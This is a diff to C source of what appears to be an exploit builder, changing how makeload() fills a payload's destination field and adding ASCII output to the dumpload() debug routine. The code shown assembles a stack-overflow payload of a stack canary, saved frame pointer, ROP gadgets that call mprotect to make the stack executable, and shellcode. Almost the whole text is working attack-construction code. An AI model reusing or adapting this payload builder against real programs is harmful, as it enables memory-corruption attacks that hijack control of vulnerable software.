@@ -29,8 +29,7 @@ ssize_t makeload(PayloadPtr plp, BaseAddressesPtr baseAddressesPtr, char *p, ssi
 	// Offsets are relative to the payload
 	baseAddressesPtr->buf_base = plp;
 
-	memset(plp->pl_dst, 0, sizeof(plp->pl_dst));
-
+	plp->pl_dst.o		= indirectToOffset(&plp->pl_dst, 'B', baseAddressesPtr);
 	plp->pl_canary.o	= indirectToOffset(&plp->pl_canary, 'B', baseAddressesPtr);
 	plp->pl_rbp.o		= indirectToOffset(&plp->pl_rbp, 'B', baseAddressesPtr);
 	plp->pl_popRDI.o	= libc_popRDI?pointerToOffset(libc_popRDI, 'L', baseAddressesPtr):pointerToOffset(&&l_popRDI, 'P', baseAddressesPtr);
@@ -67,20 +66,36 @@ l_popRDX:	 // Fallback gadget for "POP RDX"
 	return makeShellcode(&plp->pl_scu.sc, p, np);
 } // makeload()
 
-void dumpload(PayloadPtr plp, BaseAddressesPtr baseAddressesPtr) {
-	fprintf(stderr, "--------------------------------------------\n");
-	fprintf(stderr, "%20s: %018p\n",	"pl_canary.p",		plp->pl_canary.p);
-	fprintf(stderr, "%20s: %018p\n",	"pl_rbp.p",		plp->pl_rbp.p);
 
-	fprintf(stderr, "%20s: %018p\n",	"pl_popRDI.p",		plp->pl_popRDI.p);
-	fprintf(stderr, "%20s: %018p\n",	"pl_stackPage.p",	plp->pl_stackPage.p);
-	fprintf(stderr, "%20s: %018p\n",	"pl_popRSI.p",		plp->pl_popRSI.p);
-	fprintf(stderr, "%20s: %#tx\n",		"pl_stackSize",		plp->pl_stackSize);
-	fprintf(stderr, "%20s: %018p\n",	"pl_popRDX.p",		plp->pl_popRDX.p);
-	fprintf(stderr, "%20s: %#tx\n",		"pl_permission",	plp->pl_permission);
-	fprintf(stderr, "%20s: %018p\n",	"pl_mprotect.p",	plp->pl_mprotect.p);
+static char *p8(void *s0) {
+	static char d[sizeof(Pointer)];
+	char *s = (char *) s0;
+
+	assert(sizeof(d) == 8);
+	for (int i = 0; i < sizeof(Pointer); i++)
+		d[i] = ((s[i] < ' ') || (s[i] > '~')) ? '.' : s[i];
+
+	return d;
+}
+
+void dumpload(PayloadPtr plp, BaseAddressesPtr baseAddressesPtr) {
+	char fmt[] = "%20s: %018p (\"%.8s\")\n";
+
+	fprintf(stderr, "--------------------------------------------\n");
+	fprintf(stderr, fmt, "pl_dst.p",        plp->pl_dst.p,       p8(&plp->pl_dst));
+
+	fprintf(stderr, fmt, "pl_canary.p",     plp->pl_canary.p,    p8(&plp->pl_canary));
+	fprintf(stderr, fmt, "pl_rbp.p",        plp->pl_rbp.p,       p8(&plp->pl_rbp));
+
+	fprintf(stderr, fmt, "pl_popRDI.p",     plp->pl_popRDI.p,    p8(&plp->pl_popRDI));
+	fprintf(stderr, fmt, "pl_stackPage.p",  plp->pl_stackPage.p, p8(&plp->pl_stackPage));
+	fprintf(stderr, fmt, "pl_popRSI.p",     plp->pl_popRSI.p,    p8(&plp->pl_popRSI));
+	fprintf(stderr, fmt, "pl_stackSize",    plp->pl_stackSize,   p8(&plp->pl_stackSize));
+	fprintf(stderr, fmt, "pl_popRDX.p",     plp->pl_popRDX.p,    p8(&plp->pl_popRDX));
+	fprintf(stderr, fmt, "pl_permission.p", plp->pl_permission,  p8(&plp->pl_permission));
+	fprintf(stderr, fmt, "pl_mprotect.p",   plp->pl_mprotect.p,  p8(&plp->pl_mprotect));
 	
-	fprintf(stderr, "%20s: %018p\n",	"pl_shellCode.p",	plp->pl_shellCode.p);
+	fprintf(stderr, fmt, "pl_shellCode.p",  plp->pl_shellCode.p, p8(&plp->pl_shellCode));
 
 	dumpShellcode(&plp->pl_scu.sc);
 	fprintf(stderr, "--------------------------------------------\n");
